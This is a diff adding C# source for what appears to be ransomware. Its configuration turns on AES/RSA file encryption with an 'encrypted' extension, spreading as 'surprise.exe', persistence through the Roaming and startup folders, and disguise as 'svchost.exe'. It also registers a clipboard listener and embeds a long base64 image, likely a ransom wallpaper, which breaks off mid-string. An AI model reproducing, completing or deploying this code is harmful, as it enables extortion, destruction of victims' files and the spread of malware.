@@ -1,0 +1,628 @@
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace ConsoleApplication7;
+
+internal class Program
+{
+	public static class NativeMethods
+	{
+		public const int clp = 797;
+
+		public static IntPtr intpreclp = new IntPtr(-3);
+
+		[DllImport("user32.dll", SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		public static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+		[DllImport("user32.dll", SetLastError = true)]
+		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+	}
+
+	private static string userName = Environment.UserName;
+
+	private static string userDir = "C:\\Users\\";
+
+	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
+
+	public static bool encryptionAesRsa = true;
+
+	public static string encryptedFileExtension = "encrypted";
+
+	private static bool checkSpread = true;
+
+	private static string spreadName = "surprise.exe";
+
+	private static bool checkCopyRoaming = true;
+
+	private static string processName = "svchost.exe";
+
+	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
+
+	private static bool checkStartupFolder = true;
+
+	private static bool checkSleep = false;
+
+	private static int sleepTextbox = 10;
+
+	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIAaUDzgMBIgACEQEDEQH/xAAeAAEAAgICAwEAAAAAAAAAAAAABQkGCAcKAQMEAv/EAGAQAAEDAwIDAwYGCg0IBgoDAAABAgMEBQYHEQgSIQkUMRNBUVWV0xUiNmF0sxYjMjhScXaRsrQXGDVCVFdic3WBkrXUGSQ3coKTlrElKDlWodInMzRYZWZ3tsHRo6TC/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/ALP+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAIvuuS+t7Z7Ok9+O65L63tns6T35KACL7rkvre2ezpPfjuuS+t7Z7Ok9+SgAi+65L63tns6T347rkvre2ezpPfkoAI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